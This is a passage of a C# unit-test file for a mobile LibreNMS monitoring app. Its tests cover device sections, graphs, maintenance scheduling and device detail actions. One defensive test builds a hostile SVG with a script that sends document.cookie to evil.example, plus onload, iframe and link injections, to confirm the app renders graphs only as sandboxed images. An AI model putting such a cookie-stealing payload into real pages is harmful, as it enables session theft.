using DashyNMS.Mobile.DeviceSections;
using DashyNMS.Mobile.Services;
using DashyNMS.Mobile.ViewModels;
using DesktopNMS.Core.Api;
using DesktopNMS.Core.Configuration;
using DesktopNMS.Core.Models;
using Microsoft.Extensions.Time.Testing;

namespace DashyNMS.Mobile.Tests;

public sealed class DeviceSectionLoaderTests
{
    private const int DeviceId = 7;

    private readonly ILibreNmsClient _client = Fakes.Client();
    private readonly AppSettings _appSettings = new();
    private readonly DeviceSectionLoader _loader;

    public DeviceSectionLoaderTests() => _loader = new DeviceSectionLoader(_client, Fakes.Settings(_appSettings));

    private Task<IReadOnlyList<SectionGroup>> Load(DeviceSection section) => _loader.LoadAsync(section, DeviceId);

    private static Port Port(int id, string name, string oper = "up", string admin = "up", double? inRate = null, double? outRate = null) =>
        new() { PortId = id, DeviceId = DeviceId, IfIndex = id, IfName = name, IfDescr = name, IfOperStatus = oper, IfAdminStatus = admin, IfInOctetsRate = inRate, IfOutOctetsRate = outRate, IfSpeed = 1_000_000_000 };

    [Fact]
    public async Task An_endpoint_librenms_doesnt_have_for_the_device_is_an_empty_section_not_a_failure()
    {
        // As device 444's VLANs (#91): LibreNMS answers 404.
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<Vlan>>(_ => throw new LibreNmsApiException("No VLANs found", System.Net.HttpStatusCode.NotFound));

        Assert.Empty(await Load(DeviceSection.Vlans));

        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Vlans));
        card.Show(await Load(DeviceSection.Vlans));
        Assert.False(card.IsVisible); // drops out, as an empty section does
    }

    [Fact]
    public async Task A_real_failure_still_fails_so_the_card_can_say_so()
    {
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<Vlan>>(_ => throw new LibreNmsApiException("Server error", System.Net.HttpStatusCode.InternalServerError));

        await Assert.ThrowsAsync<LibreNmsApiException>(() => Load(DeviceSection.Vlans));
    }

    [Fact]
    public async Task Sensors_are_this_devices_only_grouped_by_kind_with_desktops_thresholds()
    {
        _client.Sensors.ListAsync(Arg.Any<CancellationToken>()).Returns(
        [
            new Sensor { SensorId = 1, DeviceId = DeviceId, SensorClass = "temperature", Description = "CPU", Current = 45 },
            new Sensor { SensorId = 2, DeviceId = DeviceId, SensorClass = "temperature", Description = "Inlet", Current = 90, LimitHigh = 70 },
            new Sensor { SensorId = 3, DeviceId = DeviceId, SensorClass = "voltage", Description = "PSU 1", Current = 12.1, LimitLow = 11, LimitHigh = 13 },
            new Sensor { SensorId = 4, DeviceId = 99, SensorClass = "temperature", Description = "Someone else's", Current = 20 },
        ]);

        var groups = await Load(DeviceSection.Sensors);

        Assert.Equal(["Temperature", "Voltage"], groups.Select(g => g.Name));
        var temperature = groups[0];
        Assert.Equal(["CPU", "Inlet"], temperature.Select(r => r.Title));
        Assert.Equal("45 °C", temperature[0].Value);
        Assert.Equal(RowStatus.Critical, temperature[1].Status); // over its own LibreNMS limit
        Assert.Equal("12.1 V", groups[1][0].Value);
        Assert.Equal(RowStatus.Ok, groups[1][0].Status);
        Assert.Equal("Limits 11 to 13 V", groups[1][0].Subtitle);
    }

    [Theory]
    [InlineData(50, null, RowStatus.Ok)]
    [InlineData(85, null, RowStatus.Warning)]
    [InlineData(97, null, RowStatus.Critical)]
    [InlineData(65, 60.0, RowStatus.Warning)] // the device's own warning level
    public void Usage_is_coloured_against_its_warning_level(double percent, double? warning, RowStatus expected)
    {
        var row = DeviceSectionLoader.UsageRow("Memory", percent, warning, 4L << 30, 8L << 30);

        Assert.Equal(expected, row.Status);
        Assert.Equal(percent / 100, row.Bar);
    }

    [Fact]
    public async Task Resources_group_cpu_memory_and_storage()
    {
        _client.Health.ListProcessorsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([new ProcessorSensor { Description = "CPU 0", UsagePercent = 12 }]);
        _client.Health.ListMempoolsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([new MempoolSensor { Description = "RAM", UsagePercent = 50, UsedBytes = 4L << 30, TotalBytes = 8L << 30 }]);
        _client.Health.ListStorageAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<StorageVolume>());

        var groups = await Load(DeviceSection.Resources);

        Assert.Equal(["Processors", "Memory"], groups.Select(g => g.Name)); // empty Storage left out
        Assert.Equal("4 GB of 8 GB", groups[1][0].Subtitle);
    }

    [Fact]
    public async Task Ports_put_the_ones_that_need_looking_at_first()
    {
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            Port(1, "Gi0/1", inRate: 1_250_000, outRate: 125_000),
            Port(2, "Gi0/2", oper: "down"),
            Port(3, "Gi0/3", oper: "down", admin: "down"),
        ]);

        var groups = await Load(DeviceSection.Ports);

        Assert.Equal(["Down", "Up", "Shut down"], groups.Select(g => g.Name));
        Assert.Equal(RowStatus.Critical, groups[0][0].Status);
        Assert.Equal("↓10 Mb/s  ↑1 Mb/s", groups[1][0].Value); // octets/s to bits/s
        Assert.Equal("1 Gb/s", groups[1][0].Detail);
        Assert.Equal(RowStatus.Inactive, groups[2][0].Status);
    }

    [Fact]
    public async Task Neighbours_link_to_their_devices()
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 1, LocalDeviceId = DeviceId, LocalPortId = 1, RemoteHostname = "core-sw", RemoteDeviceId = 3, RemotePort = "Gi1/0/48", Protocol = "lldp", Active = true }]);
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "Gi0/1")]);

        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Neighbours)));

        Assert.Equal("core-sw", row.Title);
        Assert.Equal("Gi0/1 → Gi1/0/48", row.Subtitle);
        Assert.Equal("LLDP", row.Value);
        Assert.Equal(3, row.LinkDeviceId);
    }

    [Fact]
    public async Task Vlans_count_the_ports_carrying_each()
    {
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(
        [
            new Vlan { DeviceId = DeviceId, VlanNumber = 10, VlanName = "Users" },
            new Vlan { DeviceId = DeviceId, VlanNumber = 20, VlanName = "Voice" },
            new Vlan { DeviceId = 99, VlanNumber = 30 },
        ]);
        var trunk = Port(1, "Gi0/1");
        trunk.Vlans = [new PortVlanMembership { Vlan = 10 }, new PortVlanMembership { Vlan = 20 }];
        var access = Port(2, "Gi0/2");
        access.IfVlan = 10;
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([trunk, access]);

        var rows = Assert.Single(await Load(DeviceSection.Vlans));

        Assert.Equal(["VLAN 10", "VLAN 20"], rows.Select(r => r.Title));
        Assert.Equal(["2 ports", "1 port"], rows.Select(r => r.Value));
    }

    [Fact]
    public async Task Arp_sorts_addresses_numerically_and_tidies_macs()
    {
        _client.Arp.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new ArpEntry { PortId = 1, Ipv4Address = "10.0.0.10", MacAddress = "AABBCCDDEEFF" },
            new ArpEntry { PortId = 1, Ipv4Address = "10.0.0.9", MacAddress = "00:11:22:33:44:55" },
        ]);
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "Vlan10")]);

        var rows = Assert.Single(await Load(DeviceSection.Arp));

        Assert.Equal(["10.0.0.9", "10.0.0.10"], rows.Select(r => r.Title));
        Assert.Equal("aa:bb:cc:dd:ee:ff", rows[1].Subtitle);
        Assert.Equal("Vlan10", rows[0].Value);
    }

    [Fact]
    public async Task Routing_shows_bgp_state_and_leaves_out_empty_groups()
    {
        _client.Routing.ListBgpSessionsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new BgpSession { PeerIdentifier = "192.0.2.1", RemoteAs = 64500, State = "established", EstablishedSeconds = 3 * 86400 },
            new BgpSession { PeerIdentifier = "192.0.2.2", RemoteAs = 64501, State = "active", LastErrorText = "Hold timer expired" },
        ]);
        _client.Routing.ListOspfNeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<OspfNeighbour>());
        _client.Routing.ListOspfv3NeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<Ospfv3Neighbour>());
        _client.Routing.ListVrfsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<Vrf>());

        var bgp = Assert.Single(await Load(DeviceSection.Routing));

        Assert.Equal("BGP sessions", bgp.Name);
        Assert.Equal("192.0.2.2", bgp[0].Title); // the broken one first
        Assert.Equal(RowStatus.Critical, bgp[0].Status);
        Assert.Equal("Hold timer expired", bgp[0].Detail);
        Assert.Equal("Up 3d 0h", bgp[1].Detail);
    }

    [Fact]
    public async Task Inventory_is_a_tree_with_depth()
    {
        _client.Devices.GetInventoryAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new InventoryEntry { Id = 1, Index = 1, ContainedIn = 0, Name = "Chassis", Class = "chassis", Serial = "FOC123" },
            new InventoryEntry { Id = 2, Index = 2, ContainedIn = 1, Name = "PSU 1", Class = "powerSupply" },
        ]);

        var rows = Assert.Single(await Load(DeviceSection.Inventory));

        Assert.Equal([0, 1], rows.Select(r => r.Depth));
        Assert.Equal("Serial FOC123", rows[0].Detail);
    }

    [Fact]
    public async Task Event_log_is_newest_first_and_coloured_by_severity()
    {
        _client.Logs.ListEventLogAsync(DeviceId, DeviceSectionLoader.EventLogLimit, Arg.Any<CancellationToken>()).Returns(
        [
            new EventLogEntry { Message = "Older", Timestamp = new DateTime(2026, 1, 1), Severity = 2 },
            new EventLogEntry { Message = "Device rebooted", Timestamp = new DateTime(2026, 1, 2), Severity = 5, Type = "reboot" },
        ]);

        var rows = Assert.Single(await Load(DeviceSection.EventLog));

        Assert.Equal(["Device rebooted", "Older"], rows.Select(r => r.Title));
        Assert.Equal(RowStatus.Critical, rows[0].Status);
        Assert.Contains("reboot", rows[0].Subtitle);
    }

    [Fact]
    public async Task Availability_shows_windows_and_outages_including_ongoing()
    {
        _client.Devices.GetAvailabilityAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new AvailabilityWindow { DurationSeconds = 604800, Percent = 99.5 }, new AvailabilityWindow { DurationSeconds = 86400, Percent = 100 }]);
        _client.Devices.GetOutagesAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new DeviceOutage { GoingDown = DateTime.Now.AddHours(-2) }]);

        var groups = await Load(DeviceSection.Availability);

        Assert.Equal(["Last 24 hours", "Last 7 days"], groups[0].Select(r => r.Title));
        Assert.Equal(RowStatus.Warning, groups[0][1].Status);
        Assert.Equal("Still down", groups[1][0].Subtitle);
        Assert.Equal(RowStatus.Critical, groups[1][0].Status);
    }

    [Theory]
    [InlineData("AABBCCDDEEFF", "aa:bb:cc:dd:ee:ff")]
    [InlineData("aa-bb-cc-dd-ee-ff", "aa:bb:cc:dd:ee:ff")]
    [InlineData("weird", "weird")]
    [InlineData(null, "—")]
    public void Macs(string? raw, string expected) => Assert.Equal(expected, DeviceSectionLoader.Mac(raw));

    [Theory]
    [InlineData(999.0, "999 b/s")]
    [InlineData(12_345_678.0, "12.3 Mb/s")]
    [InlineData(1_000_000_000.0, "1 Gb/s")]
    public void Bit_rates(double bits, string expected) => Assert.Equal(expected, Units.Bits(bits));
}

public sealed class DeviceSectionViewModelTests
{
    [Fact]
    public async Task Search_narrows_rows_and_drops_empty_groups()
    {
        var client = Fakes.Client();
        client.Arp.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(
            Enumerable.Range(1, 20).Select(i => new ArpEntry { PortId = 1, Ipv4Address = $"10.0.0.{i}", MacAddress = $"0011223344{i:D2}" }).ToList());
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<Port>());
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), new RecordingNavigation());

        await vm.LoadAsync(7, DeviceSection.Arp, "edge-rtr");

        Assert.Equal("ARP · edge-rtr", vm.Title);
        Assert.True(vm.ShowSearch);
        vm.SearchText = "10.0.0.2";
        Assert.Equal(["10.0.0.2", "10.0.0.20"], vm.Groups.Single().Select(r => r.Title));
        vm.SearchText = "nothing";
        Assert.True(vm.IsEmpty);
        Assert.Equal("Nothing matches.", vm.EmptyText);
    }

    [Fact]
    public async Task An_empty_section_says_so()
    {
        var client = Fakes.Client();
        client.Fdb.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<FdbEntry>());
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<Port>());
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), new RecordingNavigation());

        await vm.LoadAsync(7, DeviceSection.Fdb);

        Assert.True(vm.IsEmpty);
        Assert.Equal("LibreNMS has no fdb for this device.", vm.EmptyText);
    }

    [Fact]
    public async Task Tapping_a_neighbour_that_is_a_device_opens_it()
    {
        var navigation = new RecordingNavigation();
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(Fakes.Client(), Fakes.Settings()), navigation);

        await vm.OpenLinkCommand.ExecuteAsync(new SectionRow("core-sw") { LinkDeviceId = 3 });
        await vm.OpenLinkCommand.ExecuteAsync(new SectionRow("unknown phone"));

        Assert.Equal(3, navigation.Visits.Single().Parameters![Routes.DeviceIdParameter]);
    }

    [Fact]
    public async Task Tapping_a_port_opens_its_graphs()
    {
        var navigation = new RecordingNavigation();
        var client = Fakes.Client();
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns([new Port { PortId = 1, IfName = "Gi0/5", IfDescr = "GigabitEthernet0/5", IfOperStatus = "up" }]);
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), navigation);
        await vm.LoadAsync(7, DeviceSection.Ports, "edge-rtr");

        var row = vm.Groups.SelectMany(g => g).Single();
        Assert.True(row.IsLink);
        await vm.OpenLinkCommand.ExecuteAsync(row);

        var visit = navigation.Visits.Single();
        Assert.Equal(Routes.DeviceGraphs, visit.Route);
        Assert.Equal(7, visit.Parameters![Routes.DeviceIdParameter]);
        Assert.Equal("Gi0/5", visit.Parameters[Routes.PortParameter]);
        Assert.Equal("edge-rtr", visit.Parameters[Routes.DeviceNameParameter]);
    }
}

public sealed class GraphTests
{
    private const string RrdSvg = "<?xml version=\"1.0\"?><svg width=\"800pt\" height=\"400pt\" xmlns=\"http://www.w3.org/2000/svg\"><text fill=\"rgb(0%, 0%, 0%)\">In</text></svg>";

    [Fact]
    public void Graphs_get_a_viewbox_so_they_scale_to_the_screen()
    {
        var scalable = GraphHtml.MakeScalable(RrdSvg);

        Assert.Contains("viewBox=\"0 0 800 400\"", scalable);
        Assert.Equal(scalable, GraphHtml.MakeScalable(scalable)); // only once
    }

    [Fact]
    public void Small_graphs_are_restyled_into_the_apps_colours_in_either_theme()
    {
        // Core's GraphSvgStyle recolours rrdtool's black text, as desktop's graphs (#158).
        var light = GraphHtml.Build(RrdSvg, dark: false);
        var dark = GraphHtml.Build(RrdSvg, dark: true);

        Assert.DoesNotContain("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(light));
        Assert.DoesNotContain("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(dark));
        Assert.Contains("#FFFFFF", light);
        Assert.Contains("#11141A", dark);

        // The Graphs page restyles first, choosing its series: Page only wraps.
        Assert.Contains("rgb(0%, 0%, 0%)", GraphHtml.ImageOf(GraphHtml.Page(RrdSvg, dark: true)));
    }

    [Fact]
    public void The_graph_fits_its_own_shape() =>
        Assert.Equal(0.5, GraphHtml.AspectOf(RrdSvg));

    [Fact]
    public void A_hostile_graph_is_shown_as_an_image_never_as_markup()
    {
        const string hostile = "<svg width=\"10\" height=\"10\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"steal()\">"
            + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>"
            + "<foreignObject><iframe src=\"https://evil.example/\"></iframe></foreignObject>"
            + "<a href=\"https://evil.example/\"><text>click</text></a></svg>";

        var page = GraphHtml.Build(hostile, dark: false);

        // Nothing from the SVG reaches the page as markup...
        Assert.DoesNotContain("<script", page, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onload", page, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example", page, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<iframe", page, StringComparison.OrdinalIgnoreCase);

        // ...it's only an image, under a policy that allows no script or network.
        Assert.Contains("src=\"data:image/svg+xml;base64,", page);
        Assert.Contains($"content=\"{GraphHtml.ContentSecurityPolicy}\"", page);
        Assert.Contains("default-src 'none'", GraphHtml.ContentSecurityPolicy);
        Assert.DoesNotContain("script-src", GraphHtml.ContentSecurityPolicy);
        Assert.Contains("<script>", GraphHtml.ImageOf(page)); // still in the image, where it can't run
    }

    [Fact]
    public void An_svg_without_a_namespace_gets_one_so_it_draws_as_an_image()
    {
        Assert.Contains("xmlns=\"http://www.w3.org/2000/svg\"", GraphHtml.WithNamespace("<svg width=\"1\"><g/></svg>"));
        Assert.Equal(RrdSvg, GraphHtml.WithNamespace(RrdSvg));
    }

    [Fact]
    public async Task Graphs_merge_desktops_three_lists_and_draw_the_first()
    {
        var client = Fakes.Client();
        client.Graphs.ListAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_uptime", Description = "Uptime" }]);
        client.Graphs.ListHealthAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_temperature", Description = "Temperature" }]);
        client.Graphs.ListWirelessAsync(7, Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<GraphType>>(_ => throw new LibreNmsApiException("no wireless", System.Net.HttpStatusCode.NotFound));
        client.Graphs.GetSvgAsync(7, Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);

        await vm.LoadAsync(7, "edge-rtr");

        Assert.Equal(["Temperature", "Uptime"], vm.Graphs.Select(g => g.Description));
        Assert.Equal("device_temperature", vm.SelectedGraph!.Name);
        Assert.Contains("viewBox", GraphHtml.ImageOf(vm.GraphPage!));
        await client.Graphs.Received(1).GetSvgAsync(7, "device_temperature", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Graphs_open_on_the_graph_tapped_over_its_range_not_the_first()
    {
        var client = Fakes.Client();
        client.Graphs.ListAsync(7, Arg.Any<CancellationToken>()).Returns(
        [
            new GraphType { Name = "device_uptime", Description = "Uptime" },
            new GraphType { Name = "device_icmp_perf", Description = "Ping response" },
        ]);
        client.Graphs.ListHealthAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_temperature", Description = "Temperature" }]);
        client.Graphs.ListWirelessAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<GraphType>());
        client.Graphs.GetSvgAsync(7, Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);

        await vm.LoadAsync(7, "edge-rtr", "device_icmp_perf", GraphTimeRangePreset.Week);

        Assert.Equal("device_icmp_perf", vm.SelectedGraph!.Name); // not Ping response's alphabetical neighbour (#119)
        Assert.Equal(GraphTimeRangePreset.Week, vm.SelectedRange.Range.Preset);
        await client.Graphs.Received().GetSvgAsync(7, "device_icmp_perf", GraphTimeRange.LastWeek, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());

        // One the device no longer has: its first, as before.
        var again = new DeviceGraphsViewModel(client);
        await again.LoadAsync(7, "edge-rtr", "gone_graph");
        Assert.Equal("device_icmp_perf", again.SelectedGraph!.Name); // "Ping response" sorts first
    }

    [Fact]
    public async Task Changing_the_range_redraws_and_going_back_uses_the_cache()
    {
        var client = Fakes.Client();
        client.Graphs.ListAsync(7, Arg.Any<CancellationToken>()).Returns([new GraphType { Name = "device_uptime", Description = "Uptime" }]);
        client.Graphs.ListHealthAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<GraphType>());
        client.Graphs.ListWirelessAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<GraphType>());
        client.Graphs.GetSvgAsync(7, Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);
        await vm.LoadAsync(7);

        vm.SelectRangeCommand.Execute(vm.Ranges[2]); // week
        await vm.LoadGraphAsync();
        vm.SelectRangeCommand.Execute(vm.Ranges[1]); // back to day
        await vm.LoadGraphAsync();

        await client.Graphs.Received(1).GetSvgAsync(7, "device_uptime", GraphTimeRange.LastWeek, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
        await client.Graphs.Received(1).GetSvgAsync(7, "device_uptime", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task A_port_shows_desktops_port_graphs_starting_with_traffic()
    {
        var client = Fakes.Client();
        client.Graphs.GetPortSvgAsync(7, Arg.Any<string>(), Arg.Any<string>(), Arg.Any<GraphTimeRange>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>()).Returns(RrdSvg);
        var vm = new DeviceGraphsViewModel(client);

        await vm.LoadPortAsync(7, "Gi0/5", "GigabitEthernet0/5", "edge-rtr");

        Assert.Equal("GigabitEthernet0/5 · edge-rtr", vm.Title);
        Assert.Equal(["port_bits", "port_upkts", "port_nupkts", "port_errors"], vm.Graphs.Select(g => g.Name));
        Assert.Equal("port_bits", vm.SelectedGraph!.Name);
        Assert.NotNull(vm.GraphPage);
        await client.Graphs.Received(1).GetPortSvgAsync(7, "Gi0/5", "port_bits", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
        await client.Graphs.DidNotReceiveWithAnyArgs().GetSvgAsync(default, default!, default, default, default, default);
        await client.Graphs.DidNotReceiveWithAnyArgs().ListAsync(default, default);

        vm.SelectedGraph = vm.Graphs[3];
        await vm.LoadGraphAsync();
        await client.Graphs.Received(1).GetPortSvgAsync(7, "Gi0/5", "port_errors", GraphTimeRange.LastDay, Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>());
    }
}

public sealed class MaintenanceViewModelTests
{
    private readonly ILibreNmsClient _client = Fakes.Client();
    private readonly IDialogService _dialogs = Substitute.For<IDialogService>();
    private readonly RecordingNavigation _navigation = new();
    private readonly FakeTimeProvider _time = new(new DateTimeOffset(2026, 9, 28, 9, 7, 0, TimeSpan.Zero));

    private MaintenanceViewModel NewViewModel()
    {
        _time.SetLocalTimeZone(TimeZoneInfo.Utc);
        var vm = new MaintenanceViewModel(_client, _dialogs, _navigation, _time);
        vm.Initialize(7, "edge-rtr");
        return vm;
    }

    [Fact]
    public async Task Starts_now_for_an_hour_skipping_alerts_by_default_as_desktop()
    {
        DeviceMaintenanceRequest? sent = null;
        _client.Devices.ScheduleMaintenanceAsync(7, Arg.Do<DeviceMaintenanceRequest>(r => sent = r), Arg.Any<CancellationToken>())
            .Returns("Device edge-rtr will begin maintenance mode now for 1h");
        var vm = NewViewModel();

        await vm.SaveCommand.ExecuteAsync(null);

        Assert.Null(sent!.Start);
        Assert.Equal("1:00", sent.Duration);
        Assert.Equal((int)MaintenanceBehavior.SkipAlerts, sent.Behavior);
        await _dialogs.Received(1).AlertAsync("Maintenance scheduled", "Device edge-rtr will begin maintenance mode now for 1h");
        Assert.Equal(Routes.Back, _navigation.Visits.Single().Route);
    }

    [Fact]
    public async Task Later_start_is_sent_as_picked_in_server_time()
    {
        DeviceMaintenanceRequest? sent = null;
        _client.Devices.ScheduleMaintenanceAsync(7, Arg.Do<DeviceMaintenanceRequest>(r => sent = r), Arg.Any<CancellationToken>()).Returns("ok");
        var vm = NewViewModel();

        Assert.Equal(new TimeSpan(9, 15, 0), vm.StartTime); // next quarter hour
        vm.StartNow = false;
        vm.StartDate = new DateTime(2026, 9, 29);
        vm.StartTime = new TimeSpan(22, 30, 0);
        vm.ApplyPresetCommand.Execute(vm.Presets.Single(p => p.Label == "30m"));
        vm.SelectedBehavior = vm.Behaviors[1];
        vm.MaintenanceTitle = "  Firmware  ";

        await vm.SaveCommand.ExecuteAsync(null);

        Assert.Equal("2026-09-29 22:30:00", sent!.Start);
        Assert.Equal("0:30", sent.Duration);
        Assert.Equal((int)MaintenanceBehavior.MuteAlerts, sent.Behavior);
        Assert.Equal("Firmware", sent.Title);
    }

    [Fact]
    public async Task A_zero_duration_or_a_past_start_is_refused()
    {
        var vm = NewViewModel();
        vm.DurationHours = 0;
        vm.DurationMinutes = 0;
        await vm.SaveCommand.ExecuteAsync(null);
        Assert.True(vm.HasError);

        vm.DurationHours = 1;
        vm.StartNow = false;
        vm.StartDate = new DateTime(2026, 9, 27);
        await vm.SaveCommand.ExecuteAsync(null);
        Assert.Contains("already passed", vm.ErrorMessage);

        await _client.Devices.DidNotReceiveWithAnyArgs().ScheduleMaintenanceAsync(default, default!, default);
    }
}

public sealed class DeviceDetailActionTests
{
    private readonly ILibreNmsClient _client = Fakes.Client();
    private readonly IDialogService _dialogs = Substitute.For<IDialogService>();
    private readonly RecordingNavigation _navigation = new();
    private readonly DeviceDetailViewModel _vm;

    public DeviceDetailActionTests()
    {
        _client.Devices.GetAsync("7", Arg.Any<CancellationToken>()).Returns(Fakes.Device(7, "edge-rtr"));
        var settings = Fakes.Settings();
        _vm = new DeviceDetailViewModel(_client, settings, Substitute.For<ILauncherService>(), new DeviceBookmarks(settings, TimeProvider.System), _dialogs, _navigation);
    }

    [Fact]
    public async Task The_foot_of_the_page_says_when_it_was_last_polled()
    {
        var device = Fakes.Device(8, "core-sw");
        device.LastDiscovered = DateTime.Now.AddHours(-3);
        device.LastPolled = new DateTime(2026, 10, 1, 9, 41, 7);
        device.LastPolledTimeTaken = 4.2;
        _client.Devices.GetAsync("8", Arg.Any<CancellationToken>()).Returns(device);

        await _vm.LoadAsync(8);

        Assert.StartsWith("Last polled ", _vm.FreshnessText);
        var polled = Assert.Single(_vm.Properties, p => p.Key == "Last polled");
        Assert.EndsWith(", took 4.2s", polled.Value);
        Assert.Contains(_vm.Properties, p => p.Key == "Last discovered"); // still listed (#97)
    }

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public async Task Last_polled_sent_with_its_own_zone_reads_right_whatever_the_UTC_setting(bool serverTimestampsAreUtc)
    {
        // LibreNMS sends last_polled as a zoned ISO string (a Laravel datetime
        // cast), unlike its other times; read as unzoned it came out an hour
        // ahead in BST, so every device said "just now" (DashyNMS/desktop#210).
        var polled = DateTime.UtcNow.AddMinutes(-9).ToString("yyyy-MM-ddTHH:mm:ss.ffffff'Z'", System.Globalization.CultureInfo.InvariantCulture);
        var device = System.Text.Json.JsonSerializer.Deserialize<Device>(
            $$"""{ "device_id": 11, "hostname": "core-sw", "last_polled": "{{polled}}" }""",
            DesktopNMS.Core.Json.LibreNmsJson.Options)!;
        _client.Devices.GetAsync("11", Arg.Any<CancellationToken>()).Returns(device);
        var settings = Fakes.Settings(new AppSettings { ServerTimestampsAreUtc = serverTimestampsAreUtc });
        var vm = new DeviceDetailViewModel(_client, settings, Substitute.For<ILauncherService>(), new DeviceBookmarks(settings, TimeProvider.System), _dialogs, _navigation);

        await vm.LoadAsync(11);

        Assert.Equal("Last polled 9m ago", vm.FreshnessText);
    }

    [Theory]
    [InlineData(4.234, "took 4.2s")]
    [InlineData(61.8, "took 62s")]
    [InlineData(-1d, null)]
    [InlineData(null, null)]
    public void A_polls_length_reads_plainly(double? seconds, string? expected) =>
        Assert.Equal(expected, DeviceDetailViewModel.TookText(seconds));

    [Fact]
    public async Task Without_a_poll_time_the_foot_falls_back_to_last_discovered()
    {
        var device = Fakes.Device(9, "old-server");
        device.LastDiscovered = DateTime.Now.AddHours(-3);
        _client.Devices.GetAsync("9", Arg.Any<CancellationToken>()).Returns(device);

        await _vm.LoadAsync(9);

        Assert.StartsWith("Last discovered ", _vm.FreshnessText);
        Assert.DoesNotContain(_vm.Properties, p => p.Key == "Last polled");
    }

    [Fact]
    public async Task Rediscover_asks_first_then_shows_librenms_reply()
    {
        await _vm.LoadAsync(7);
        _dialogs.ConfirmAsync(default!, default!, default!, default!).ReturnsForAnyArgs(true);
        _client.Devices.DiscoverAsync(7, Arg.Any<CancellationToken>()).Returns("Device will be rediscovered");

        await _vm.RediscoverCommand.ExecuteAsync(null);

        await _dialogs.Received(1).AlertAsync("Rediscover requested", "Device will be rediscovered");
    }

    [Fact]
    public async Task Rediscover_goes_ahead_without_asking()
    {
        await _vm.LoadAsync(7);

        await _vm.RediscoverCommand.ExecuteAsync(null);

        // One device, and harmless: it just happens (#146).
        await _dialogs.DidNotReceiveWithAnyArgs().ConfirmAsync(default!, default!, default!, default!);
        await _client.Devices.Received(1).DiscoverAsync(7, Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Sections_open_their_page_with_the_device()
    {
        await _vm.LoadAsync(7);

        await _vm.OpenSectionCommand.ExecuteAsync(DeviceSectionInfo.For(DeviceSection.Ports));
        await _vm.OpenSectionCommand.ExecuteAsync(DeviceSectionInfo.For(DeviceSection.Graphs));
        await _vm.ScheduleMaintenanceCommand.ExecuteAsync(null);

